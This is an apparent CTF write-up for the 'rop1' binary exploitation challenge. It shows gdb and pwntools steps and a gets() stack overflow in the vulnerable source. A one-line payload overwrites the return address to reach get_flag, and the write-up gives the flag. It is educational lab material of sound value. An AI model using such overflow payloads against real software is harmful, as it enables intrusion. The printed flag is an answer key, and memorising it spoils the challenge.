# rop1
Binary Exploitation - 100 points

## Challenge 
> Written by r3ndom

> Go to [`/problems/rop1`](./rop1) on the shell server and tell me whats in `flag.txt`.

## Solution

### 1. Get return address
	user72122@shell:/problems/rop1$ gdb rop1

	(gdb) info add get_flag
	Symbol "get_flag" is at 0x400646 in a file compiled without debugging.

### 2. Get little endian string
	# python
	>>> import pwn
	>>> pwn.p32(0x400646)
	'F\x06@\x00'

### 3. Find offset

From source, array is 64 bytes...

	void get_input()
	{
		char inp[64];
		gets(inp);
		printf("You said: %s\n", inp);
	}

Hence, offset is either 68 or 72.

Unfortunately, strace didn't work for some reason (si_addr shows 0)

	$ pwn cyclic 100
	$ echo 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa' | 
	strace ./rop1 
	(...)
	--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_ACCERR, si_addr=0} ---
	+++ killed by SIGSEGV (core dumped) +++



### 4. Make payload

	user72122@shell:/problems/rop1$ python -c 'print "\x00"*72 + "F\x06@\x00"' | ./rop1
	You said: 
	easyctf{r0ps_and_h0ps}


## Flag
`easyctf{r0ps_and_h0ps}`